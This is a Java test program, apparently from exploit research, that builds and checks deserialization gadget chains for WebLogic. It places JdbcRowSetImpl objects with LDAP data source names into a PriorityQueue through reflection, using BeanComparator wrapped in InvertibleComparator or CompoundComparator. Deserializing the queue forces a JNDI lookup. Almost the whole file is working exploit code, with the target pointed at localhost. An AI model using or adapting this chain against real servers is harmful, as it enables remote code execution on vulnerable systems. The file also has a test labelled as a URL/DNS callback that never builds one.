import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * Test PriorityQueue-based chains (WL9, WL10) with actual serialization roundtrip.
 * Uses DNS callback to detect JNDI/connect attempts.
 */
public class PQTest {
    public static void main(String[] args) throws Exception {
        System.out.println("=== PriorityQueue Chain Tests ===\n");

        testWL9_InvertiblePQ();
        testWL9_InvertiblePQ_WithURL();
    }

    /**
     * WL9: InvertibleComparator in PriorityQueue.
     * PriorityQueue.readObject() -> heapify() -> InvertibleComparator.compare()
     * -> delegated comparator.compare() on queue elements
     */
    static void testWL9_InvertiblePQ() throws Exception {
        System.out.println("[WL9] InvertibleComparator + PriorityQueue roundtrip");

        Class<?> invCompClass = Class.forName(
            "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator");

        // Create an inner comparator that triggers JNDI when compare() is called
        // In a real exploit, this would be a BeanComparator or similar
        // For testing, use a Comparator that calls toString() on elements
        // which could trigger JNDI on certain objects

        // First test: verify PriorityQueue serialization roundtrip triggers compare()
        // Use String.CASE_INSENSITIVE_ORDER (it's Serializable)
        Object invComp = invCompClass.getDeclaredConstructor(Comparator.class)
            .newInstance(String.CASE_INSENSITIVE_ORDER);

        @SuppressWarnings("unchecked")
        Comparator<Object> typedComp = (Comparator<Object>) invComp;

        // Build PriorityQueue with 2 elements (minimum for heapify to call compare)
        PriorityQueue<Object> pq = new PriorityQueue<>(2, typedComp);
        pq.add("aaaa");
        pq.add("bbbb");

        System.out.println("  PriorityQueue created with 2 elements");

        // Serialize
        byte[] data = serialize(pq);
        System.out.println("  Serialized: " + data.length + " bytes");

        // Deserialize
        Object deser = deserialize(data);
        System.out.println("  Deserialized: " + deser.getClass().getName());
        System.out.println("  PASS: PriorityQueue + InvertibleComparator roundtrip works");

        // Now the real test: can we replace the inner comparator with something
        // that triggers JNDI? We need a Serializable Comparator that calls
        // getters on the compared objects.

        // Check if BeanComparator is available (commons-beanutils)
        try {
            Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
            System.out.println("  BeanComparator: AVAILABLE");

            // BeanComparator.compare() calls PropertyUtils.getProperty(obj, property)
            // If property="databaseMetaData" and obj=JdbcRowSetImpl -> JNDI!
            Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
                .newInstance("databaseMetaData");
            System.out.println("  Created BeanComparator('databaseMetaData')");

            // Wrap in InvertibleComparator
            Object invComp2 = invCompClass.getDeclaredConstructor(Comparator.class)
                .newInstance(beanComp);

            // Create PriorityQueue with JdbcRowSetImpl elements
            Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
            Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
            jrsClass.getMethod("setDataSourceName", String.class)
                .invoke(jrs1, "ldap://127.0.0.1:1389/WL9_BEANCOMP");

            Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
            jrsClass.getMethod("setDataSourceName", String.class)
                .invoke(jrs2, "ldap://127.0.0.1:1389/WL9_BEANCOMP2");

            // Build PQ using reflection to avoid triggering compare during add
            @SuppressWarnings("unchecked")
            PriorityQueue<Object> pq2 = new PriorityQueue<>(2, (Comparator<Object>) invComp2);
            // Add dummy elements first, then replace
            Field queueField = PriorityQueue.class.getDeclaredField("queue");
            queueField.setAccessible(true);
            Field sizeField = PriorityQueue.class.getDeclaredField("size");
            sizeField.setAccessible(true);

            Object[] queueArray = new Object[]{jrs1, jrs2};
            queueField.set(pq2, queueArray);
            sizeField.set(pq2, 2);

            System.out.println("  PQ2 built with JdbcRowSetImpl elements (reflection)");

            // Serialize
            byte[] data2 = serialize(pq2);
            System.out.println("  Serialized: " + data2.length + " bytes");

            // Deserialize - THIS should trigger:
            // readObject -> heapify -> InvertibleComparator.compare(jrs1, jrs2)
            //   -> BeanComparator.compare(jrs1, jrs2)
            //     -> PropertyUtils.getProperty(jrs1, "databaseMetaData")
            //       -> JdbcRowSetImpl.getDatabaseMetaData()
            //         -> connect() -> InitialContext.lookup(dataSource)
            System.out.println("  Deserializing (watching for JNDI)...");
            try {
                Object deser2 = deserialize(data2);
                System.out.println("  Deserialized normally - no JNDI triggered");
            } catch (Throwable e) {
                String fullTrace = fullStackTrace(e);
                if (isJndiException(fullTrace)) {
                    System.out.println("  *** PASS: JNDI TRIGGERED! ***");
                    System.out.println("  Chain: PQ.readObject -> heapify -> InvertibleComparator.compare");
                    System.out.println("         -> BeanComparator.compare -> JdbcRowSetImpl.getDatabaseMetaData");
                    System.out.println("         -> connect() -> InitialContext.lookup(ldap://...)");
                } else {
                    System.out.println("  Exception: " + truncate(e.toString(), 300));
                }
                // Always print full cause chain for analysis
                System.out.println("  --- Full cause chain ---");
                Throwable curr = e;
                int d = 0;
                while (curr != null && d < 10) {
                    System.out.println("  [" + d + "] " + curr.getClass().getName() + ": " + truncate(curr.getMessage(), 200));
                    curr = curr.getCause();
                    d++;
                }
                // Also print the full stack trace
                System.out.println("  --- Stack trace (filtered) ---");
                for (String line : fullTrace.split("\n")) {
                    if (line.contains("JdbcRowSet") || line.contains("BeanComparator")
                        || line.contains("InvertibleComparator") || line.contains("CompoundComparator")
                        || line.contains("PriorityQueue") || line.contains("connect")
                        || line.contains("InitialContext") || line.contains("lookup")
                        || line.contains("javax.naming") || line.contains("getDatabaseMetaData")) {
                        System.out.println("  " + line.trim());
                    }
                }
            }
        } catch (ClassNotFoundException e) {
            System.out.println("  BeanComparator: NOT AVAILABLE (need commons-beanutils)");
        }
        System.out.println();
    }

    /**
     * WL9 variant: Use URL object as PQ element (URL.hashCode triggers DNS)
     */
    static void testWL9_InvertiblePQ_WithURL() throws Exception {
        System.out.println("[WL9-DNS] InvertibleComparator + PQ + URL (DNS callback test)");

        Class<?> invCompClass = Class.forName(
            "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator");

        // Use a comparator that calls hashCode on elements
        // URL.hashCode() triggers DNS lookup!
        Comparator<Object> hashComp = (a, b) -> {
            return Integer.compare(a.hashCode(), b.hashCode());
        };

        // But hashComp is not Serializable... use a known Serializable comparator
        // Actually, InvertibleComparator wrapping String.CASE_INSENSITIVE_ORDER is safe
        // The key is: what Serializable Comparator calls getters on elements?

        // Try: CompoundComparator from BEA Spring
        try {
            Class<?> compCompClass = Class.forName(
                "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator");
            System.out.println("  CompoundComparator: AVAILABLE");
            boolean serializable = Serializable.class.isAssignableFrom(compCompClass);
            System.out.println("  Serializable: " + serializable);

            if (serializable) {
                // CompoundComparator.compare() iterates over inner comparators
                // If inner list contains a BeanComparator -> triggers getProperty
                Object compComp = compCompClass.getDeclaredConstructor().newInstance();

                // Add a comparator to the inner list
                Method addMethod = null;
                for (Method m : compCompClass.getMethods()) {
                    if (m.getName().equals("addComparator") && m.getParameterCount() == 1) {
                        addMethod = m;
                        break;
                    }
                }

                if (addMethod != null) {
                    // Try adding BeanComparator
                    try {
                        Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
                        Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
                            .newInstance("databaseMetaData");
                        addMethod.invoke(compComp, beanComp);
                        System.out.println("  Added BeanComparator('databaseMetaData') to CompoundComparator");

                        // Build PQ with JdbcRowSetImpl
                        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
                        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
                        jrsClass.getMethod("setDataSourceName", String.class)
                            .invoke(jrs1, "ldap://127.0.0.1:1389/WL9_COMPOUND_BEAN");

                        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
                        jrsClass.getMethod("setDataSourceName", String.class)
                            .invoke(jrs2, "ldap://127.0.0.1:1389/WL9_COMPOUND_BEAN2");

                        @SuppressWarnings("unchecked")
                        Comparator<Object> typedComp = (Comparator<Object>) compComp;
                        PriorityQueue<Object> pq = new PriorityQueue<>(2, typedComp);
                        Field queueField = PriorityQueue.class.getDeclaredField("queue");
                        queueField.setAccessible(true);
                        Field sizeField = PriorityQueue.class.getDeclaredField("size");
                        sizeField.setAccessible(true);
                        queueField.set(pq, new Object[]{jrs1, jrs2});
                        sizeField.set(pq, 2);

                        byte[] data = serialize(pq);
                        System.out.println("  Serialized: " + data.length + " bytes");

                        System.out.println("  Deserializing...");
                        try {
                            deserialize(data);
                            System.out.println("  No exception");
                        } catch (Throwable e) {
                            String msg = fullStackTrace(e);
                            if (isJndiException(msg)) {
                                System.out.println("  *** PASS: JNDI TRIGGERED via CompoundComparator chain! ***");
                                printRelevantStack(e);
                            } else {
                                System.out.println("  Exception: " + truncate(e.toString(), 300));
                                printRelevantStack(e);
                            }
                        }
                    } catch (ClassNotFoundException e) {
                        System.out.println("  BeanComparator not available");
                    }
                }
            }
        } catch (ClassNotFoundException e) {
            System.out.println("  CompoundComparator: NOT AVAILABLE");
        }
        System.out.println();
    }

    // --- Utility ---

    static boolean isJndiException(String msg) {
        if (msg == null) return false;
        String lower = msg.toLowerCase();
        return lower.contains("jndi") || lower.contains("javax.naming")
            || lower.contains("initialcontext") || lower.contains("ldap://")
            || lower.contains("communicationexception") || lower.contains("connection refused")
            || lower.contains("connectexception") || lower.contains("namingexception")
            || lower.contains("lookup");
    }

    static String fullStackTrace(Throwable t) {
        StringWriter sw = new StringWriter();
        t.printStackTrace(new PrintWriter(sw));
        return sw.toString();
    }

    static void printRelevantStack(Throwable e) {
        Throwable curr = e;
        int depth = 0;
        while (curr != null && depth < 6) {
            System.out.println("  [" + depth + "] " + curr.getClass().getSimpleName() + ": "
                + truncate(curr.getMessage(), 150));
            curr = curr.getCause();
            depth++;
        }
    }

    static Object createWithoutConstructor(Class<?> clazz) {
        try {
            Class<?> rfClass = Class.forName("sun.reflect.ReflectionFactory");
            Method getFactory = rfClass.getMethod("getReflectionFactory");
            Object rf = getFactory.invoke(null);
            Method newCSFA = rfClass.getMethod("newConstructorForSerialization",
                Class.class, Constructor.class);
            Constructor<?> objCtor = Object.class.getDeclaredConstructor();
            Constructor<?> ctor = (Constructor<?>) newCSFA.invoke(rf, clazz, objCtor);
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (Exception e) {
            try {
                Constructor<?> c = clazz.getDeclaredConstructor();
                c.setAccessible(true);
                return c.newInstance();
            } catch (Exception e2) { return null; }
        }
    }

    static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();
        return bos.toByteArray();
    }

    static Object deserialize(byte[] data) throws Exception {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        return ois.readObject();
    }

    static String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
